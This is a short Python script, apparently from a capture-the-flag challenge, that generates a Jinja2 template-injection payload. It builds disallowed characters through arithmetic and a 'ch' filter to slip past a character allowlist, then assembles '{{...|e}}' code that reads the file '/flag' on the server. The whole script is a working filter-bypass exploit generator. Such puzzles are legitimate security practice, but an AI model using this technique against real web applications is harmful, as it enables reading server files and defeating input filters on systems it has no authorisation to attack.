codes = {
    'n': '(64%2b46)|ch',
    '/': '(46%2b1)|ch',
    'a': '(46%2b46%2b6-1)|ch',
    'p': '(4*4*(6%2b1))|ch',
    '.': '46|ch',
    'f': '(4*6*4%2b6)|ch',
    'g': '(4*6*4%2b6%2b1)|ch',
}

allowlist = [
    "c",
    "{",
    "}",
    "d",
    "6",
    "l",
    "(",
    "b",
    "o",
    "r",
    ")",
    '"',
    "1",
    "4",
    "+",
    "h",
    "u",
    "-",
    "*",
    "e",
    "|",
    "'",
]

payload_str = "(open('/flag').read())"
payload_blocks = []

try:
    assert set(payload_str) - set(allowlist) == set(codes.keys())
except:
    raise AssertionError('Need codes for ' + str((set(payload_str) - set(allowlist)) - set(codes.keys())))

# These are for building the portions of the payload string that are literal, i.e. not constructed using arthimetic and |ch 
building_literal = False
literal = ''

def completeLiteral():
    global building_literal
    global literal
    payload_blocks.append('"' + literal + '"')
    literal = ''
    building_literal = False

for c in payload_str:
    if c in codes.keys():
        if building_literal:
            completeLiteral()
        payload_blocks.append(codes[c])
    else:
        building_literal = True
        literal += c
if building_literal:
    completeLiteral()

full_payload = '{{(' + '%2b'.join(payload_blocks) + ')|e}}'

print(full_payload)
print(len(full_payload.replace('%2b', '+')))